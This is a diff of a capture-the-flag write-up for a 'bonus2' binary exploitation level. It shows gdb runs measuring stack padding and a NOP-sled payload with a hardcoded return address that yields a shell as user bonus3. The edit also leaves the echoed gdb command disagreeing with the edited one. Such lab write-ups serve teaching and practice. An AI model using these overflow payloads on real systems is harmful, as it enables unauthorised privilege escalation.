@@ -59,17 +59,8 @@ So the distance is 76 - 13 = 63.
 Before to fo further I need to be sure of these numbers.
 
 ```shell
-(gdb) r `python -c 'print "A"*40'` `python -c 'print "A"*19 + "1234"'`
+(gdb) r `python -c 'print "A"*40'` `python -c 'print "A"*23 + "1234"'`
 Starting program: /home/user/bonus2/bonus2 `python -c 'print "A"*40'` `python -c 'print "A"*19 + "1234"'`
-(gdb) x/32a $ebp
-0xbffff638:	0x41414141	0x33323141	0x41410034	0x41414141
-```
-
-Oh, it's always good to check, as we can see the padding isn't good I have to remove 1 byte from the second argument !
-
-```shell
-(gdb) r `python -c 'print "A"*40'` `python -c 'print "A"*18 + "1234"'`
-Starting program: /home/user/bonus2/bonus2 `python -c 'print "A"*40'` `python -c 'print "A"*18 + "1234"'`
 (gdb) x/32a $ebp
 0xbffff638:	0x41414141	0x34333231	0x41414100	0x41414141
 ```
@@ -95,8 +86,8 @@ Now I can start to build my payload.
 
 ```shell
 $ python -c 'print "\x90" * 40' > /tmp/payload_part1
-$ python -c 'print "\x90" * 18 + "\xd2\xf8\xff\xbf"' > /tmp/payload_part2
-$ ./bonus `cat /tmp/payload_part1` `cat /tmp/payload_part2`
+$ python -c 'print "\x90" * 23 + "\xd2\xf8\xff\xbf"' > /tmp/payload_part2
+$ ./bonus2 `cat /tmp/payload_part1` `cat /tmp/payload_part2`
 Hyvää päivää ��������������������������������������������������������������
 $ whoami
 bonus3
